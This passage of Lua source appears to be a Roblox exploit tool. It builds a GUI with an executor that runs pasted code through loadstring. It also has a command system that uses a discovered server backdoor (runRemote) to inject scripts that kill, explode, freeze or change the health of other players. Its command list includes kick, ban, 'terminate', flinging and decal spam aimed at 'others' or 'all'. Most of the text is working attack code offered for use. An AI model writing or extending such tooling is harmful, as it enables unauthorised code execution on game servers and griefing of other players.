		{id = "134713831368801", name = "gbywmogas"},

		{id = "77227669080312", name = "victor dice a joel reggatone"},
		{id = "912995590639144", name = "angel jumpstyle"},
		{id = "120023444803460", name = "jumpstyle i forgot the name of"},
	},
	["gear IDs"] = {
		{id = "16726030", name = "cheeseburger"},
		{id = "13745494", name = "turkey leg"},
		{id = "16214845", name = "cake"},

		{id = "16722267", name = "moneybag"},
		{id = "78730532", name = "body swap potion"},
		{id = "80576967", name = "spray paint"},

		{id = "225921000", name = "rainbow carpet"},
		{id = "99119158", name = "speed coil"},
		{id = "16688968", name = "gravity coil"},

		{id = "10472779", name = "bloxy cola"},
		{id = "10727852", name = "witches brew"},
		{id = "21392199", name = "chocolate milk"},

		{id = "15177716", name = "taco"},
		{id = "12848902", name = "teddy bloxpin"},
		{id = "113328094", name = "lightblox jar"},

		{id = "11563251", name = "fuse bomb"},
		{id = "11450664", name = "slateskin potion"},
		{id = "11419319", name = "healing potion"},

		{id = "120307951", name = "noir periastron psi"},
		{id = "108158379", name = "ivory periastron"},
		{id = "80597060", name = "fake chartreuse periastron gamma"},

		{id = "233520257", name = "joyful periastron epsilon"},
		{id = "73829193", name = "grimgold periastron beta"},
		{id = "2544549379", name = "fall periastron xi"},

		{id = "159229806", name = "rainbow periastron omega"},
		{id = "99119240", name = "crimson periastron mu"},
		{id = "69499437", name = "azure periastron alpha"},

		{id = "80661504", name = "chartreuse periastron gamma"},
		{id = "139577901", name = "festive periastron chi"},
		{id = "93136802", name = "amethyst periastron kappa"},

		{id = "97885508", name = "the general's .45"},
		{id = "116693764", name = "historic timmy gun"},
		{id = "34870758", name = "wormhole tunneler"},

		{id = "130113146", name = "hyperlaser gun"},
		{id = "212296936", name = "red hyperlaser gun"},
		{id = "1427401206", name = "green hyperlaser gun"},

		{id = "94233344", name = "shotgun"},
		{id = "33879504", name = "flamethrower"},
		{id = "11999247", name = "subspace tripmine"},
	}
}

savedAssetIdPageIndex = 1

assetIdPages = {"image IDs", "sound IDs", "gear IDs"}
currentAssetIdPageIndex = 1
currentpg = 1
assetsPerPage = 3

function updateAssetIdTypeIndicator()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	unable["asset id type indicator"].Text = assetType .. " [page " .. currentpg .. "/" .. totalpgs .. "]"
end

function updatePage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local assets = assetData[assetType]

	local lockedSoundImage = "rbxassetid://110126477790022"
	local soundImageColor = unable["default border color"]
	local gearBaseUrl = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId="

	for i = 1, assetsPerPage do
		local assetIndex = (currentpg - 1) * assetsPerPage + i
		local asset = assets[assetIndex]

		if asset then
			if assetType == "sound IDs" then
				unable["asset image " .. i].Image = lockedSoundImage
				unable["asset image " .. i].ImageColor3 = soundImageColor
			elseif assetType == "gear IDs" then
				unable["asset image " .. i].Image = gearBaseUrl .. asset.id
				unable["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			else
				unable["asset image " .. i].Image = asset.image
				unable["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			end

			unable["asset image name " .. i].Text = asset.name
			unable["asset image id " .. i].Text = "id: " .. asset.id
		else
			unable["asset image " .. i].Image = "rbxassetid://0"
			unable["asset image name " .. i].Text = "empty"
			unable["asset image id " .. i].Text = "id: empty"
		end
	end

	updateAssetIdTypeIndicator()
end

function nextPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg + 1
	if currentpg > totalpgs then
		currentpg = 1
	end
	updatePage()
end

function previousPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg - 1
	if currentpg < 1 then
		currentpg = totalpgs
	end
	updatePage()
end

function nextAssetType()
	currentAssetIdPageIndex = currentAssetIdPageIndex % #assetIdPages + 1
	currentpg = 1
	updatePage()
end

function previousAssetType()
	currentAssetIdPageIndex = (currentAssetIdPageIndex - 2) % #assetIdPages + 1
	currentpg = 1
	updatePage()
end

unable["switch asset id type button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

unable["switch asset id type button 2"].MouseButton1Click:Connect(function()
	playclicksound()
	nextAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

unable["previous page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	nextPage()
end)

unable["next page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousPage()
end)

updatePage()

local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

function toClipboard(txt)
	if everyClipboard then
		everyClipboard(tostring(txt))
	end
end

function copyAssetId(assetId)
	toClipboard(assetId)
end

for i = 1, 3 do
	local copyButton = unable["copy asset id " .. i .. " button"]
	local assetIdLabel = unable["asset image id " .. i]

	copyButton.MouseButton1Click:Connect(function()
		spawn(function() playclicksound() end)
		local assetIdText = assetIdLabel.Text
		local assetId = assetIdText:match("%d+")
		if assetId then
			copyAssetId(assetId)
		end
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

unable["executor tab"].Size = UDim2.new(0, 100, 0, 26)
unable["executor tab"].Position = UDim2.new(0, 301, 0, 1)

unable["executor tab"].BackgroundColor3 = unable["default background color"]

unable["executor tab"].BorderColor3 = unable["default border color"]
unable["executor tab"].BorderSizePixel = 1

unable["executor tab"].TextColor3 = unable["default border color"]
unable["executor tab"].Font = Enum.Font.RobotoMono
unable["executor tab"].TextSize = 15
unable["executor tab"].TextScaled = false
unable["executor tab"].Text = "executor"
unable["executor tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["executor tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["executor tab text padding"] = Instance.new("UIPadding")
unable["executor tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["executor tab text padding"].Parent = unable["executor tab"]

unable["executor tab"].Parent = unable["main frame 1"]
unable["executor tab"].ZIndex = 19

-------------------------------------------------------------------------------------------------------------------------------

unable["executor scrolling frame"].Size = UDim2.new(0, 393, 0, 164)
unable["executor scrolling frame"].Position = UDim2.new(0, 4, 0, 32)
unable["executor scrolling frame"].BackgroundColor3 = unable["default background color"]
unable["executor scrolling frame"].BorderColor3 = unable["default border color"]
unable["executor scrolling frame"].BorderSizePixel = 1
unable["executor scrolling frame"].ScrollBarThickness = 8
unable["executor scrolling frame"].ScrollBarImageColor3 = unable["default 1/2 color"]
unable["executor scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
unable["executor scrolling frame"].Parent = unable["main frame 1"]
unable["executor scrolling frame"].ZIndex = 19
unable["executor scrolling frame"].Visible = false
unable["executor scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

unable["executor textbox"].Size = UDim2.new(0, 393, 0, 164)
unable["executor textbox"].Position = UDim2.new(0, 0, 0, 0)
unable["executor textbox"].BackgroundColor3 = unable["default background color"]
unable["executor textbox"].BorderColor3 = unable["default border color"]
unable["executor textbox"].BorderSizePixel = 0
unable["executor textbox"].TextColor3 = unable["default border color"]
unable["executor textbox"].PlaceholderText = "paste script here"
unable["executor textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["executor textbox"].Font = Enum.Font.RobotoMono
unable["executor textbox"].TextSize = 15
unable["executor textbox"].TextScaled = false
unable["executor textbox"].Text = "print(\"goodbye world!\")"
unable["executor textbox"].TextXAlignment = Enum.TextXAlignment.Left
unable["executor textbox"].TextYAlignment = Enum.TextYAlignment.Top
unable["executor textbox"].ClearTextOnFocus = false
unable["executor textbox"].MultiLine = true
unable["executor textbox"].Parent = unable["executor scrolling frame"]
unable["executor textbox"].ZIndex = 20

unable["executor textbox text padding"] = Instance.new("UIPadding")
unable["executor textbox text padding"].PaddingLeft = UDim.new(0, 4)
unable["executor textbox text padding"].PaddingTop = UDim.new(0, 4)
unable["executor textbox text padding"].PaddingBottom = UDim.new(0, 4)
unable["executor textbox text padding"].Parent = unable["executor scrolling frame"]

function updateCanvas()
	local textBounds = unable["executor textbox"].TextBounds
	unable["executor textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	unable["executor scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)
end

unable["executor textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas)

spawn(updateCanvas)

unable["execute button"].Size = UDim2.new(0, 158, 0, 45)
unable["execute button"].Position = UDim2.new(0, 4, 0, 201)

unable["execute button"].BackgroundColor3 = unable["default background color"]

unable["execute button"].BorderColor3 = unable["default border color"]
unable["execute button"].BorderSizePixel = 1

unable["execute button"].TextColor3 = unable["default border color"]
unable["execute button"].Font = Enum.Font.RobotoMono
unable["execute button"].TextSize = 15
unable["execute button"].TextScaled = false
unable["execute button"].Text = "execute"
unable["execute button"].TextXAlignment = Enum.TextXAlignment.Center
unable["execute button"].TextYAlignment = Enum.TextYAlignment.Center

unable["execute button text padding"] = Instance.new("UIPadding")
unable["execute button text padding"].PaddingLeft = UDim.new(0, 0)
unable["execute button text padding"].Parent = unable["execute button"]

unable["execute button"].Parent = unable["main frame 1"]
unable["execute button"].ZIndex = 19
unable["execute button"].Visible = false

unable["execute from client button"].Size = UDim2.new(0, 158, 0, 45)
unable["execute from client button"].Position = UDim2.new(0, 167, 0, 201)

unable["execute from client button"].BackgroundColor3 = unable["default background color"]

unable["execute from client button"].BorderColor3 = unable["default border color"]
unable["execute from client button"].BorderSizePixel = 1

unable["execute from client button"].TextColor3 = unable["default border color"]
unable["execute from client button"].Font = Enum.Font.RobotoMono
unable["execute from client button"].TextSize = 15
unable["execute from client button"].TextScaled = false
unable["execute from client button"].Text = "execute from client"
unable["execute from client button"].TextXAlignment = Enum.TextXAlignment.Center
unable["execute from client button"].TextYAlignment = Enum.TextYAlignment.Center

unable["execute from client button text padding"] = Instance.new("UIPadding")
unable["execute from client button text padding"].PaddingLeft = UDim.new(0, 0)
unable["execute from client button text padding"].Parent = unable["execute button"]

unable["execute from client button"].Parent = unable["main frame 1"]
unable["execute from client button"].ZIndex = 19
unable["execute from client button"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

unable["clear button"].Size = UDim2.new(0, 67, 0, 45)
unable["clear button"].Position = UDim2.new(0, 330, 0, 201)

unable["clear button"].BackgroundColor3 = unable["default background color"]

unable["clear button"].BorderColor3 = unable["default border color"]
unable["clear button"].BorderSizePixel = 1

unable["clear button"].TextColor3 = unable["default border color"]
unable["clear button"].Font = Enum.Font.RobotoMono
unable["clear button"].TextSize = 15
unable["clear button"].TextScaled = false
unable["clear button"].Text = "clear"
unable["clear button"].TextXAlignment = Enum.TextXAlignment.Center
unable["clear button"].TextYAlignment = Enum.TextYAlignment.Center

unable["clear button text padding"] = Instance.new("UIPadding")
unable["clear button text padding"].PaddingLeft = UDim.new(0, 0)
unable["clear button text padding"].Parent = unable["clear button"]

unable["clear button"].Parent = unable["main frame 1"]
unable["clear button"].ZIndex = 19
unable["clear button"].Visible = false

unable["execute button"].MouseButton1Click:Connect(function()
	if backdoor ~= nil then return end
	if hasscanned == true then return end
	local code = unable["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

unable["execute from client button"].MouseButton1Click:Connect(function()
	local code = unable["executor textbox"].Text
	spawn(function() playclicksound() end)
	if code and code ~= "" then
		assert(loadstring(code))()
	end
end)

unable["clear button"].MouseButton1Click:Connect(function()
	unable["executor textbox"].Text = ""
	updateCanvas()
	playclicksound()
end)

-------------------------------------------------------------------------------------------------------------------------------

local commandList = {
	"kill [target]",
	"health [target] [number]",
	"bodyfling, bfling [target]",
	"walkfling, wfling",
	"unwalkfling, unwfling",
	"freeze, ice [target]",
	"unfreeze, thaw [target]",
	"kick [target] [text]",
	"ban [target]",
	"accountdelete, terminate [target]",
	"kazotskykick, kk [target]",
	-- "explode [target]",
	-- "bang [target]",
	-- "unbang",
	-- "carpet [target]",
	-- "uncarpet",
	-- "facebang [target]",
	-- "unfacebang",
	"jumpscare, js [target] [image id] [sound id]",
	-- "popup [target] [image id]",
	-- "unpopup [target]",
	-- "playaudio [target] [sound id]",
	"headbillboard, headbb [target] [image id]",
	"unheadbillboard, unheadbb [target]",
	-- "torsobillboard [target] [image id]",
	-- "untorsobillboard [target]",
	-- "punish [target]",
	-- "unpunish [target]",
	"spin [target] [speed]",
	"unspin [target]",
	-- "orbit [target] [speed] [offset]",
	-- "unorbit",
	-- "follow [target]",
	-- "unfollow",
	-- "creeper [target]",
	-- "uncreeper [target]",
	-- "headless [target]",
	-- "unheadless [target]",
	-- "hairless [target]",
	-- "unhairless [target]",
	"accessoryless, aless [target]",
	"unaccessoryless, unaless [target]",
	-- "forceplace [target] [game id]",
	"chickenarms, carms [target]",
	"discoavatar, davi [target]",
	"headslide, hslide [target]",
	"meshdisco, mdisco [target]",
	"fire [target]",
	"chat, talk [target] [text]",
	"particle [target] [image id]",
	"unparticle [target]",
	"screenimage, simage [target] [image id]",
	"unscreenimage, unsimage [target]",
	"r6 [target]",
	"r15 [target]",
	"respawn, re [target]",
	"eggdog [target]",
	"",
	"decalspam, dspam [image id]",
	"batchdecalspam, bdspam [image id] [batch size] [delay]",
	"billboardspam, bbspam [image id]",
	"batchbillboardspam, bbbspam [image id] [batch size] [delay]",
	"replaceskybox, sky [image id]",
	-- "billboardspray [image id]",
	-- "unbillboardspray",
	"disco",
	"undisco",
	"fullbright, fb",
	"unfullbright, unfb",
	"music [sound id]",
	"unmusic",
	"volume [number]",
	"pitch [number]",
	"console",
	"esp",
	"unesp",
	"dynamic9007, dyn9007",
	"antifling, afling",
	"unantifling, uafling",
	"walkonwalls, wallwalk",
	"",
	-- "restoremap",
	"hint [text]",
	"closehints, nohints",
	"closeunlabeledhints, noulhints",
	"closelabeledhints, nolhints",
	"message [text]",
	"closemessages, nomsgs",
	"closeunlabeledmessages, noulmsgs",
	"closelabeledmessages, nolmsgs",
	"",
	"guns [target]",
	"btools, f3x [target]",
	"tools [target]",
	"airstriketools, ast [target]",
	-- "",
	-- "dance1 [target]",
	-- "undance1 [target]",
	-- "dance2 [target]",
	-- "undance2 [target]",
	-- "dance3 [target]",
	-- "undance3 [target]",
	-- "wave [target]",
	-- "cheer [target]",
	-- "laugh [target]",
	-- "customdance [target]",
	-- "playanim [target] [animation id]",
	-- "spasm [target]",
	-- "unspasm [target]",
	-- "tpose [target]",
	-- "untpose [target]",
	-- "stopanim [target]",
	-- "reanim [target]",
	-- "headthrow [target]",
	"",
	"opendonuttab, donut",
	"openbinarytab, binary"
}

populateList(unable["list of commands"], commandList)

------------------------------------- thank you chatgpt for fixing some of the code below -------------------------------------

addcommand("kill", "kill", function(target)
	local players = game:GetService("Players"):GetPlayers()

	function breakJoints(player)
		if player and player.Character then
			player.Character:BreakJoints()
		end
	end

	function executeKillScript(targetScript)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					breakJoints(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					breakJoints(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						breakJoints(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					breakJoints(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						breakJoints(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v.Character:BreakJoints()
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v.Character:BreakJoints()
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v.Character:BreakJoints()
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v.Character:BreakJoints()
						end
					end
				]], player.Name)
				break
			end
		end
	end

	executeKillScript(targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("explode", "explode", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function explodeAndBreakJoints(player)
		if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local character = player.Character
			local explosion = Instance.new("Explosion")
			explosion.Position = character.HumanoidRootPart.Position
			explosion.BlastPressure = 0
			explosion.BlastRadius = 10
			explosion.Parent = workspace

			if character:FindFirstChild("Humanoid") then
				character.Humanoid.Health = 0
			end

			for _, part in pairs(character:GetChildren()) do
				if part:IsA("Motor6D") then
					part:Destroy()
				end
			end
		end
	end

	function executeExplosionScript(targetScript)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game:GetService("Players").LocalPlayer
				if localPlayer then
					explodeAndBreakJoints(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					explodeAndBreakJoints(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game:GetService("Players").LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						explodeAndBreakJoints(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					explodeAndBreakJoints(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						explodeAndBreakJoints(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local explosion = Instance.new("Explosion")
						explosion.Position = v.Character.HumanoidRootPart.Position
						explosion.BlastPressure = 0
						explosion.BlastRadius = 10
						explosion.Parent = workspace
						for _, part in pairs(v.Character:GetChildren()) do
							if part:IsA("Motor6D") then
								part:Destroy()
							end
						end
						v.Character.Humanoid.Health = 0
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local explosion = Instance.new("Explosion")
					explosion.Position = v.Character.HumanoidRootPart.Position
					explosion.BlastPressure = 0
					explosion.BlastRadius = 10
					explosion.Parent = workspace
					for _, part in pairs(v.Character:GetChildren()) do
						if part:IsA("Motor6D") then
							part:Destroy()
						end
					end
					v.Character.Humanoid.Health = 0
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local explosion = Instance.new("Explosion")
							explosion.Position = v.Character.HumanoidRootPart.Position
							explosion.BlastPressure = 0
							explosion.BlastRadius = 10
							explosion.Parent = workspace
							for _, part in pairs(v.Character:GetChildren()) do
								if part:IsA("Motor6D") then
									part:Destroy()
								end
							end
							v.Character.Humanoid.Health = 0
						end
					end
				]], player.Name)
				break
			end
		end
	end

	executeExplosionScript(targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("health", "health", function(target, number)
	local players = game:GetService("Players"):GetPlayers()
	local healthValue = tonumber(number)

	if not healthValue then
		return
	end

	local function setHealth(player)
		local character = player.Character
		if character then
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Health = healthValue
			end
		end
	end

	local function executeHealthScript(targetScript)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					setHealth(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					setHealth(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						setHealth(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					setHealth(player)
				end
			else
				local found = false
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						setHealth(player)
						found = true
						break
					end
				end
				if not found then
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. healthValue .. [[
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if humanoid then
								humanoid.Health = ]] .. healthValue .. [[
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. healthValue .. [[
						end
					end
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							humanoid.Health = ]] .. healthValue .. [[
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoid = character:FindFirstChildOfClass("Humanoid")
								if humanoid then
									humanoid.Health = ]] .. healthValue .. [[
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	executeHealthScript(targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

local walkflinging = false

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function disablewalkfling()
	walkflinging = false
end

function enablewalkfling()
	local humanoid = unable["local player"].Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		humanoid.Died:Connect(function()
			disablewalkfling()
		end)
	end

	local walkflinging = true
	repeat unable["run service"].Heartbeat:Wait()
		local character = unable["local player"].Character
		local root = getRoot(character)
		local vel, movel = nil, 0.1

		while not (character and character.Parent and root and root.Parent) do
			unable["run service"].Heartbeat:Wait()
			character = unable["local player"].Character
			root = getRoot(character)
		end

		vel = root.Velocity
		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)

		unable["run service"].RenderStepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel
		end

		unable["run service"].Stepped:Wait()
		if character and character.Parent and root and root.Parent then
			root.Velocity = vel + Vector3.new(0, movel, 0)
			movel = movel * -1
		end
	until walkflinging == false
end

addcommand("walkfling", "wfling", function()
	enablewalkfling()
end)

addcommand("unwalkfling", "unwfling", function()
	disablewalkfling()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("freeze", "ice", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function freezePlayer(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = true
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = true
				end
			end
		end
	end

	local function executeFreezeScript(targetScript)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					freezePlayer(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					freezePlayer(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						freezePlayer(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					freezePlayer(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						freezePlayer(player)
						break
					end
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								humanoidRootPart.Anchored = true
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = true
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = true
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = true
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = true
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = true
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	executeFreezeScript(targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("unfreeze", "thaw", function(target)
	local players = game:GetService("Players"):GetPlayers()

	local function thawPlayer(player)
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				humanoidRootPart.Anchored = false
				local humanoid = character:FindFirstChild("Humanoid")
				if humanoid then
					humanoid.PlatformStand = false
				end
			end
		end
	end

	local function executeThawScript(targetScript)
		if backdoor ~= nil then
